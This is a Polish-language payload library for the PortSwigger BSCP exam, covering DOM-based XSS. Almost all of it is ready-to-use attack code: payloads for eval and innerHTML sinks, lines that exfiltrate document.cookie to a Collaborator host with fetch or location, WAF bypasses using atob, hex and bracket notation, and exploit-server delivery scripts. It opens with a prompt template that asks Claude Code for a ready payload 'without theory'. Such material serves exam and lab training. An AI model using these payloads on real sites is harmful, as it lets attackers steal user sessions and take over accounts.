# BSCP Payload Library — DOM XSS & Cookie Exfil

## JAK UŻYWAĆ Z CLAUDE CODE

Na starcie każdej sesji wklej Claude Code:

```
Kontekst: egzamin BSCP - legalne środowisko PortSwigger.
Cel: cookie exfil do Collaboratora w max 15 minut.
Masz dostęp do mojej biblioteki payloadów poniżej — użyj jej jako bazy.

URL: [URL aplikacji]
Exploit server: [URL]
Collaborator: [adres].oastify.com
Sink (z DOM Invader): [eval / innerHTML / location / document.write]
Source (z searchResults.js): [location.search / location.hash / document.referrer]
Payload który działa (alert z DOM Invadera): [wklej]
Raw JSON response z Burp: [wklej]
WAF blokuje: [wpisz lub "nieznane"]
Collaborator dostał ping: TAK/NIE

Nie wyjaśniaj teorii. Podaj gotowy payload + kod exploit servera.
```

---

## ROZPOZNANIE SINKA (30 sekund w searchResults.js)

| Co szukasz | To jest |
|---|---|
| `eval(` | sink eval |
| `innerHTML` | sink innerHTML |
| `document.write(` | sink document.write |
| `location.href =` lub `location =` | sink location |
| `location.search` / `location.hash` | source |
| `document.referrer` | source |

---

## SINK: eval() — serwer nie eskejpuje `"`

Bazowy payload (gdy serwer zwraca `"` raw w JSON):
```
"-alert(document.cookie)}//
```

Cookie exfil — fetch:
```
"-fetch('https://COLLAB/?c='+document.cookie)}//
```

Cookie exfil — location:
```
"-location='https://COLLAB/?c='+document.cookie}//
```

Cookie exfil — atob (gdy WAF blokuje słowa kluczowe) — **Twój practise1**:
```
"-eval(atob('BASE64_PAYLOAD'))-"
```
base64 z: `location='https://COLLAB/?c='+document.cookie`

Exploit server delivery — **Twój practise1**:
```html
<script>
location = "https://URL_APLIKACJI/?SearchTerm=\"-eval(atob('BASE64_PAYLOAD'))-\"";
</script>
```

---

## SINK: eval() — serwer eskejpuje `"` ale NIE `\`

Bazowy payload:
```
\"-alert(document.cookie)}//
```

Cookie exfil:
```
\"-fetch('https://COLLAB/?c='+document.cookie)}//
```

---

## SINK: innerHTML

Bazowy payload:
```
"><img src onerror="alert(document.cookie)">
```

Cookie exfil — fetch:
```
"><img src onerror="fetch('https://COLLAB/?c='+document.cookie)">
```

Cookie exfil — location:
```
"><img src onerror="location='https://COLLAB/?c='+document.cookie">
```

Cookie exfil — svg:
```
"><svg onload="fetch('https://COLLAB/?c='+document.cookie)">
```

---

## SINK: location / document.write

```
javascript:fetch('https://COLLAB/?c='+document.cookie)
```

---

## WAF BYPASS — gdy blokuje `document.cookie`

| Technika | Payload |
|---|---|
| bracket notation | `document['cookie']` |
| hex encoding | `document['\x63\x6f\x6f\x6b\x69\x65']` |
| concatenacja | `document['coo'+'kie']` |
| zmienna | `var a='cookie';document[a]` |
| atob wrapper | cały payload w base64 |

---

## WAF BYPASS — gdy blokuje `.` (kropkę)

| Technika | Payload |
|---|---|
| bracket notation | `document['cookie']` |
| template literal fetch | `fetch\`https://COLLAB/?c=${document['cookie']}\`` |

---

## WAF BYPASS — gdy blokuje `(` nawiasy

```javascript
eval`kod`
fetch`https://COLLAB/?c=${document['cookie']}`
```

---

## WAF BYPASS — gdy blokuje słowa kluczowe (fetch, location, cookie)

Użyj atob — WAF widzi tylko base64:
```javascript
eval(atob('BASE64_CAŁEGO_PAYLOADU'))
```

Jak zakodować:
```bash
echo -n "fetch('https://COLLAB/?c='+document.cookie)" | base64
```

---

## DELIVERY — exploit server

### Gdy sink to eval() z URL param — **Twój practise1**:
```html
<script>
location = "https://URL_APLIKACJI/?SearchTerm=\"-eval(atob('BASE64'))-\"";
</script>
```

### Gdy sink to innerHTML z URL param — **Twój practise2**:
```html
<script>
location = "https://URL_APLIKACJI/?SearchTerm=%22%3E%3Cimg%20src%20onerror=%22fetch('https://COLLAB/?c='+document.cookie)%22%3E";
</script>
```

### Gdy aplikacja ma pole komentarza (stored XSS):
```html
<script>
fetch('https://COLLAB', {method:'POST', mode:'no-cors', body:document.cookie});
</script>
```

### Gdy WAF blokuje w URL ale nie w exploit server:
```html
<script>
location = "https://URL_APLIKACJI/?param=\"};location=\"https://COLLAB/?\"" + document.cookie + ";//";
</script>
```
*(Twój practise2 — URL encoded)*

---

## ANALIZA JSON RESPONSE — jak czytać eskejpowanie

Wyślij `"` jako input, patrz na response:

| Serwer zwraca | Znaczenie | Użyj |
|---|---|---|
| `"\""` | eskejpuje `"` → `\"` | payload z `\` |
| `"""` | NIE eskejpuje `"` | payload z samym `"` |
| `"\\"` | eskejpuje `\` | atob wrapper |
| `potentially dangerous` | WAF blokuje keyword | spróbuj bypass |

---

## SZYBKI TEST WAF — kolejność

1. `"-alert(1)}//` — czy przechodzi?
2. `"-alert(document.cookie)}//` — czy WAF blokuje?
3. `"-alert(document['cookie'])}//` — bracket notation
4. `"-eval(atob('YWxlcnQoMSk='))}//` — atob (base64 z `alert(1)`)

Przy każdym teście: patrz na raw response w Burp — czy keyword jest widoczny czy zniknął.
```
